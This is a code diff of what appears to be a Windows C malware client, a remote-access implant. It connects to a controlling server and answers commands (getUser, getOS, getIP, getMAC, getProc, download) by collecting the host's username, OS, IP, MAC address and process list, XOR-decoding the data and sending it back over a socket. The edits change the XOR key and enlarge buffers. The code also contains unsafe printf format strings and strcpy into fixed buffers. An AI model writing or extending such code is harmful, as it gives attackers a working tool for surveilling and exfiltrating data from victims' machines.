@@ -5,6 +5,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #include <string.h>
 
+
 char *get_output(int num){
     char buf[2000];
     char *str = NULL;
@@ -64,7 +65,7 @@ char *get_output(int num){
 char* decrypt(char *serv_command){
     int i;
     for(i = 0; i < strlen(serv_command); i++){
-        serv_command[i] ^= 0x69;
+        serv_command[i] ^= 0x7A;
     }
     return serv_command;
 }
@@ -88,6 +89,12 @@ int main(){
     size_t download_res;
     char file_name[12];
     int file_data_size;
+    char *username;
+    char *OS;
+    char *IP;
+    char *MAC;
+    char *Proc;
+
 
 
     // Initializing socket
@@ -129,55 +136,80 @@ int main(){
         if(!strcmp(command, "getUser"))
         {
             encrypt_username = (char *) malloc(20);
+            username = (char *) malloc(20);
             command_num = 1;
             printf("getUser command read\n");
             strcpy(encrypt_username, get_output(command_num));
             printf(encrypt_username);
-            send(s, encrypt_username, strlen(encrypt_username), 0);
-            free(encrypt_username);
-            //strcpy(encrypt_username, decrypt(username));
+            printf("\n");
+            //username = base64_encode((const unsigned char*)username, strlen(username));
 
+            strcpy(username, decrypt(encrypt_username));
+            printf(username);
+            send(s, username, strlen(username), 0);
+            free(encrypt_username);
+            free(username);
         }
         // getOS command from server
         else if(!strcmp(command, "getOS")){
-            encrypt_OS = (char *) malloc(40);
+            encrypt_OS = (char *) malloc(60);
+            OS = (char *) malloc(60);
             printf("getOS command read\n");
             command_num = 2;
             strcpy(encrypt_OS, get_output(command_num));
             printf(encrypt_OS);
-            send(s, encrypt_OS, strlen(encrypt_OS), 0);
+            printf("\n");
+            strcpy(OS, decrypt(encrypt_OS));
+            printf(OS);
+            send(s, OS, strlen(OS), 0);
             free(encrypt_OS);
+            free(OS);
 
         }
         // getIP command from server
         else if(!strcmp(command, "getIP")){
-            encrypt_IP = (char *) malloc(50);
+            encrypt_IP = (char *) malloc(200);
+            IP = (char *) malloc(200);
             printf("getIP command read\n");
             command_num = 3;
             strcpy(encrypt_IP, get_output(command_num));
             printf(encrypt_IP);
-            send(s, encrypt_IP, strlen(encrypt_IP), 0);
+            printf("\n");
+            strcpy(IP, decrypt(encrypt_IP));
+            send(s, IP, strlen(IP), 0);
+            //send(s, encrypt_IP, strlen(encrypt_IP), 0);
             free(encrypt_IP);
+            free(IP);
         }
         // getMAC command from server
         else if(!strcmp(command, "getMAC")){
-            encrypt_MAC = (char *) malloc(50);
+            encrypt_MAC = (char *) malloc(600);
+            MAC = (char *) malloc(600);
             printf("getMAC command read\n");
             command_num = 4;
             strcpy(encrypt_MAC, get_output(command_num));
             printf(encrypt_MAC);
-            send(s, encrypt_MAC, strlen(encrypt_MAC), 0);
+            printf("\n");
+           // send(s, encrypt_MAC, strlen(encrypt_MAC), 0);
+            strcpy(MAC, decrypt(encrypt_MAC));
+            send(s, MAC, strlen(MAC), 0);
             free(encrypt_MAC);
+            free(MAC);
         }
         //getProc command from server
         else if(!strcmp(command, "getProc")){
-            encrypt_Proc = (char *) malloc(2000);
+            encrypt_Proc = (char *) malloc(20000);
+            Proc = (char *) malloc(20000);
             printf("getProc command read\n");
             command_num = 5;
             strcpy(encrypt_Proc, get_output(command_num));
             printf(encrypt_Proc);
-            send(s, encrypt_Proc, strlen(encrypt_Proc), 0);
+            printf("\n");
+            strcpy(Proc, decrypt(encrypt_Proc));
+            send(s, Proc, strlen(Proc), 0);
+            //send(s, encrypt_Proc, strlen(encrypt_Proc), 0);
             free(encrypt_Proc);
+            free(Proc);
         }
         // download command from server
         else if(!strcmp(command, "download")){
